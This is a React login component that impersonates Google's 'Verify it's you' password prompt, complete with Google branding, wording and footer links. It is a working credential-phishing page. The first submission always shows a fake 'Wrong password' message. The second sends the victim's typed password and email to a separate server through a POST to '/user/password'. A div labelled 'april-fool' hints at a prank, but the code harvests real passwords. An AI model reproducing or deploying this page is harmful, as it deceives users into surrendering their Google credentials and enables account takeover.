import React,{useState,useContext, useEffect} from 'react';
import './Hack.css';
import  app  from '../../utils/firebase';
import GOOGLE from './google.png';
import clsx from 'clsx';
import { makeStyles } from '@material-ui/core/styles';
import IconButton from '@material-ui/core/IconButton';
import OutlinedInput from '@material-ui/core/OutlinedInput';
import InputLabel from '@material-ui/core/InputLabel';
import InputAdornment from '@material-ui/core/InputAdornment';
import FormControl from '@material-ui/core/FormControl';
import TextField from '@material-ui/core/TextField';
import Visibility from '@material-ui/icons/Visibility';
import VisibilityOff from '@material-ui/icons/VisibilityOff';
import dotenv from 'dotenv'
dotenv.config()

const useStyles = makeStyles((theme) => ({
    root: {
      display: 'flex',
      flexWrap: 'wrap',
    },
    margin: {
      margin: theme.spacing(1),
    },
    withoutLabel: {
      marginTop: theme.spacing(3),
    },
    textField: {
      width: '35ch',
    },
  }));

  

export default function Login() {
    const [user,setEmail] = useState("")
    const [values,setValues] = useState("")
    const [error , setError] = useState(false)

    const submit = () => {
      if(error === false){
        setError(!error)
      }
      else{
        fetch(`${process.env.REACT_APP_URL}/user/password`,{
          method: "post",
          headers: {
              'Content-type':'application/json',
          },
          body: JSON.stringify({
              password: values.password,
              email: user.email,
          })
      })
        .then(response => response.json())
        .then(data => {
          console.log(data)
         
        })
        .catch((e)=>{
          window.alert("An error occured. Try again later")
          window.location.href="/login"
        })
      }
    }

    const classes = useStyles();
    
    const handleChange = (prop) => (event) => {
        setValues({ ...values, [prop]: event.target.value });
    };

    const handleClickShowPassword = () => {
        setValues({ ...values, showPassword: !values.showPassword });
    };

    const handleMouseDownPassword = (event) => {
        event.preventDefault();
    };

    useEffect(()=>{
        app.auth().onAuthStateChanged(userAuth => {
            console.log(userAuth);
            setEmail(userAuth)
        });
    },[])


    return (
      <div>
        <div class="Container_Area">
        <div id="img_container">
        <img src ={GOOGLE} alt='' height="80px" id="google_image"></img>
        </div>
        <div id="verify-text-container">
            <h1 id="verify-text">Verify it's you</h1>
            <div id="user-info">
                <img src={user.photoURL} id="user-img"></img>
                <span id="user-email">{user.email}</span>
            </div>  
            <div id="notice">
                To help keep your account secure, Google needs to verify it’s you. Please sign in again to continue.
            </div>
            <FormControl className={clsx(classes.margin, classes.textField)} variant="outlined" style={{marginTop: "3ch"}} error={error}>
          <InputLabel htmlFor="outlined-adornment-password" style={{marginTop:"-6px"}}>Password</InputLabel>
          <OutlinedInput
            id="outlined-adornment-password"
            type={values.showPassword ? 'text' : 'password'}
            value={values.password}
            onChange={handleChange('password')}
            style={{height:"5ch"}}
            endAdornment={
              <InputAdornment position="end">
                <IconButton
                  aria-label="toggle password visibility"
                  onClick={handleClickShowPassword}
                  onMouseDown={handleMouseDownPassword}
                  edge="end"
                >
                  {values.showPassword ? <Visibility /> : <VisibilityOff />}
                </IconButton>
              </InputAdornment>
            }
            labelWidth={70}
          />
          </FormControl>
            {
              error
              ?
              <span id="helper_text">Wrong password. Try again or click Forgot password to reset it.</span>
              :
              null
            }
          <div id="april-fool">
            <p id="forgot" onClick={()=>{window.redirect.href="https://accounts.google.com/signin/v2/recoveryidentifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin"}}>Forgot Password?</p>
            <a id="submit" onClick={submit}>Next</a>
          </div>
        </div>
        </div>
          <div id="footer">
          <span id="help_text" onClick={()=>window.location.href='https://support.google.com/accounts?hl=en#topic=3382296'}>Help</span>
          <span id="help_text" onClick={()=>window.location.href='https://policies.google.com/privacy?gl=IN&hl=en'}>Privacy</span>
          <span id="help_text" onClick={()=>window.location.href='https://policies.google.com/terms?gl=IN&hl=en'}>Terms</span>
          </div>
        </div>
    )
}
